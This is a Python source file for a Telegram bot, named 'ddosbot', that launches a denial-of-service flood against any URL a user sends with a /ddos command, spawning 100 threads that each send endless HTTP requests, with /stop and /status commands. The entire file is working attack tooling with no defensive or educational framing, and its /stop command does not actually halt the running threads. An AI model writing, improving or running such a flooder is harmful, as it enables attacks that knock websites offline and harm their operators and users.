from pyrogram import Client, filters, enums
import threading
import requests
import sys
import time
import pyfiglet

# API credentials
api_id = "YOUR_API_ID_HERE"
api_hash = "YOUR_API_HASH_HERE"
bot_token = 'YOUR_BOT_TOKEN_HERE'

app = Client("ddosbot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

# Store active attacks
active_attacks = {}

def send_request(url):
    """Function to send requests to the target URL."""
    while True:
        try:
            response = requests.get(url)
            print(f"Attack sent to {url}, response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

@app.on_message(filters.command("ddos"))
async def handle_ddos(client, message):
    """Handle the /ddos command."""
    if len(message.command) < 2:
        await message.reply_text("⚠️ Please provide a target URL after the command. Usage: /ddos <URL>")
        return

    target_url = message.command[1]

    if target_url in active_attacks:
        await message.reply_text(f"⚠️ Attack on {target_url} is already in progress.")
        return

    num_threads = 100
    await message.reply_text(f"🚀 Launching attack on {target_url} with {num_threads} threads...")

    active_attacks[target_url] = True
    for _ in range(num_threads):
        threading.Thread(target=send_request, args=(target_url,)).start()

@app.on_message(filters.command("stop"))
async def handle_stop(client, message):
    """Handle the /stop command."""
    if len(message.command) < 2:
        await message.reply_text("⚠️ Please provide the target URL to stop. Usage: /stop <URL>")
        return

    target_url = message.command[1]

    if target_url in active_attacks:
        del active_attacks[target_url]
        await message.reply_text(f"🛑 Attack on {target_url} stopped.")
    else:
        await message.reply_text(f"⚠️ No attack is currently running on {target_url}.")

@app.on_message(filters.command("status"))
async def handle_status(client, message):
    """Handle the /status command."""
    if not active_attacks:
        await message.reply_text("ℹ️ No active attacks.")
    else:
        active_list = "\n".join(active_attacks.keys())
        await message.reply_text(f"🟢 Active attacks:\n{active_list}")

if __name__ == "__main__":
    print(pyfiglet.figlet_format("DDoS Bot"))
    print("Bot is running...")
    app.run()
